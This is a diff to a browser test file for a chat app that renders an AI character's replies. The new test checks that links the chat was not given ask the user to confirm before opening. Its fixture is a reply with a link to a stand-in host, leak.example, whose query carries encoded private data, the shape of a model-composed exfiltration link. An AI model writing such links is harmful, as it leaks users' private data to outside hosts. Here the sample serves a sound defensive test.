@@ -1,7 +1,8 @@
 """The character's words as the chat draws them (chat.js, markdown-it): the tables, nested lists and code a cheap
 model writes come out as tables, lists and code; what a reply holds of HTML, a script or a javascript: link shows
 as text and runs nothing; a picture's address is a link and nothing is fetched; addresses stop at Chinese
-punctuation; __init__, C:\\Users and 2 * 3 stay as written; a reply stopped inside its code still shows the code."""
+punctuation; __init__, C:\\Users and 2 * 3 stay as written; a reply stopped inside its code still shows the code; a
+click on an address the chat was not given shows the whole address first and opens it only on 打开."""
 from __future__ import annotations
 
 import pytest
@@ -12,11 +13,12 @@ pytestmark = pytest.mark.browser
 SAID_AT = 1_763_700_000
 
 
-def _replies(browser, app, *texts: str):
-    """The page with `texts` as the character's replies in the main chat's history, in order; links unread."""
+def _replies(browser, app, *texts: str, lang: str = ""):
+    """The page, in `lang` when one is named, with `texts` as the character's replies in the main chat's history, in
+    order; links unread."""
     app.post("/api/look/toured")
     measured(app)
-    page = browser.open(app)
+    page = browser.open(app, lang=lang)
 
     def with_replies(route) -> None:
         # The page's later asks are for what came since: nothing more.
@@ -135,6 +137,36 @@ def test_code_like_words_stay_as_written_and_chinese_bold_is_bold(app, browser):
     assert written.locator("strong, em").count() == 0
     assert bold.locator("strong").all_inner_texts() == ["注意：", "提示（重要）"]
     assert bold.inner_text() == "注意：明天下雨。提示（重要）请带伞。"
+    assert page.errors == []
+
+
+def test_a_click_on_an_address_not_given_shows_it_whole_and_opens_it_only_on_open(app, browser):
+    composed = "https://leak.example/c?d=%E5%A6%88%E5%A6%88%E7%9A%84%E7%94%9F%E6%97%A5"
+    page, (drawn,) = _replies(browser, app, f"潮汐表见 https://example.com/tides ，更多内容请看[这里]({composed})。",
+                              lang="zh")
+    # The app says which addresses the chat was given (given.py); here the composed one is not.
+    page.page.route("**/api/link/given*", lambda route: route.fulfill(
+        json={"given": "leak.example" not in route.request.url}))
+    drawn.locator("a", has_text="这里").click()
+    ask = drawn.locator(".lk-ask")
+    ask.wait_for()
+    assert ask.locator(".lk-ask-address").inner_text() == "https://leak.example/c?d=妈妈的生日"
+    assert ask.locator("button").all_inner_texts() == ["打开", "取消"]
+    page.page.wait_for_timeout(300)
+    assert page.refused == []
+    ask.locator("button", has_text="取消").click()
+    assert drawn.locator(".lk-ask").count() == 0 and page.refused == []
+    drawn.locator("a", has_text="这里").click()
+    with page.context.expect_page():
+        drawn.locator(".lk-ask button", has_text="打开").click()
+    page.page.wait_for_timeout(300)
+    assert any(url.startswith("https://leak.example/c?d=") for url in page.refused)
+    # A given address opens at once, with nothing shown first.
+    with page.context.expect_page():
+        drawn.locator("a", has_text="example.com").click()
+    page.page.wait_for_timeout(300)
+    assert drawn.locator(".lk-ask").count() == 0
+    assert any(url.startswith("https://example.com/tides") for url in page.refused)
     assert page.errors == []
 
 
